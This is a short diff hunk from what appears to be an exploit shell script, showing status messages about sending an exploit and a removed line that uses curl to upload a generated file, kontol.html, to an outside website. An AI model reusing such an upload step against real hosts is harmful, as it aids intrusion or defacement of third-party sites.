@@ -257,8 +257,6 @@ echo "[+] Sending Exploit...";
 
 echo "Code => $code" >> kontol.html;
 
-curl -T kontol.html http://apparelworld.org/
-
 sleep 5
 
 echo "[+] Success Exploited!";
